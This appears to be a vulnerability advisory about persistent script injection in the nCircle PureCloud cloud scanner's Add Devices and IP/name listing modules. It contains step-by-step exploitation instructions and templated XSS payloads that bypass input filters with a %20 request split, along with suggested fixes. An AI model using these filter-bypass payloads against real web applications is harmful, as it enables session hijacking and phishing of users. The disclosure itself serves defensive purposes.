Introduction:
=============
nCircle PureCloud is brought to you by nCircle, the leading provider of information risk and security performance management solutions. 
PureCloud delivers an enterprise-class vulnerability scanner with more than double the coverage of other providers covering thousands of 
conditions and prioritized risk assessments – all in a cloud-based solution.

nCircle PureCloud is the world’s first security scanning technology that requires no scanning infrastructure on the customer network. 
PureCloud eliminates the need for firewall changes and software or hardware deployment on a customer`s internal network.. Requiring only 
a Web browser, PureCloud securely scans a private network to identify a broad range of vulnerabilities and risks, and provides detailed 
guidance on the steps necessary to reduce or eliminate those risks. With PureCloud, small businesses and home offices benefit from nCircle’s 
most advanced enterprise class security scanning solution, without the complexity or maintenance associated with traditional SaaS or on-premise 
scanning products. PureCloud is delivered as a software service in the Cloud, making it cost-effective, efficient and widely accessible.

Severity:
=========
Medium


Details:
========
A persistent and client side POST Injection web vulnerability is detected in the in the nCircle PureCloud (cloud-based) Vulnerability Scanner Application.
The vulnerability typus allows an attacker to inject own malicious script code in the vulnerable module on application side (persistent).

1.1
The first vulnerability is located in the Scan Now > Scan Type > Perimeter Scan > Scan section when processing to request via the 
`Scan Specific Devices - [Add Devices]` module and the bound vulnerable formErrorContent exception-handling application parameters. 
The persistent injected script code will be executed out of the `invalid networks` web application exception-handling. To bypass 
the standard validation of the application filter the attacker need to provoke the specific invalid networks exception-handling error.
In the secound step the attacker splits the request of the invalid filter context to execute after it the not parsed malicious script code.
The vulnerability can be exploited on client side via force manipulated link as malicious request with medium user interaction but also 
via server side by a post injection in the later affected add server listing module.

1.2
The secound vulnerability is bound to the first issue and located in the IP & Name output listing of the scan index after processing to 
add a network/server/ip. The code will be executed out of the main ip & name listing after an evil inject via add module. To bypass the 
ip restriction filter it is required to split the request like in the first issue with a valid ip. The remote attacker includes a 
valid ip+split(%20)`+own_scriptcode to pass through the system validation filter and execute the script code out of the device name and ip listing. 


The vulnerability can be exploited with privileged application user account and low or medium required user interaction.
Successful exploitation of the vulnerability result in persistent/non-persistent session hijacking, persistent/non-persistent 
phishing, external redirect, external malware loads and persistent/non-persistent vulnerable module context manipulation.

Proof of Concept:
=================
The client- & server-side web vulnerability can be exploited by remote attackers and local privileged application user accounts with 
low or medium user interaction. For demonstration or reproduce ...

1.1
Note:
When you try to inject a standard iframe, img src, script or onload the context will be parsed by the exception-handling to 
prevent the first execution after the inject attempt. To bypass the validation we first inject a frame which matches with the invalid 
exception filter to display the error. Now, we split the request with %20 and inject our code after the split via POST.

Manually Exploitation:
1. Register an account at nCircle PureCloud to get access to the (cloud-based) Vulnerability Scanner- [https://purecloud.ncircle.com/registerinfo3/?hacknewssocial]
2. Login to your account and switch to the scan now menu, open the scan type site
3. Choose the Perimeter Scan, not the local one!
4. Include a standard script alert tag to provoke the exception-handling, split the request with %20' and inject your own frame onload script code. Save via Add!
5. The scirpt code will be executed out of the exception-handling invalid networks message.
6. Done #1 ... Successful reproduced! Press Continue to exploit also the listing :)

7. Include a valid ip, split the request (bypass the input restriction) and inject after it your own script code.
8. Watch the scan index. The code will be executed out of the vulnerable name and ip value output listing.
9. Done #2 ... Successful reproduced!

PoC:
#1 <iframe src=PROVOKEINVALIDEXCEPTION1> %20' >"<[OWN INJECTED PERSISTENT SCRIPT CODE!]>
#2 <script>alert("PROVOKEINVALIDEXCEPTION2")</script> < %20' "><[OWN INJECTED PERSISTENT SCRIPT CODE!]) <

1.2
The server-side (persistent) web vulnerability can be exploited by remote attackers and local privileged application user accounts with 
low user interaction. For demonstration or reproduce ...

[VALID NAME]%20'+%20>"<><[PERSISTENT SCRIPT CODE!]+...


Solution:
=========
Parse the exception-handling error output listing and disallow error echos with requested web context.
To fix the vulnerability parse the context of the input fields in the add devices module. Restrict the the input fields with a secure filter mask. 
Parse also the name & ip scan index output listing and restrict the input of the requested web context scan listing.

Risk:
=====
1.1
The security risk of the client- and server-side post injection web vulnerability in the exception handling and listing is estimated as medium(+).

1.2
The security risk of the persistent input validation vulnerability in the scan index listing is estimated as medium(+).
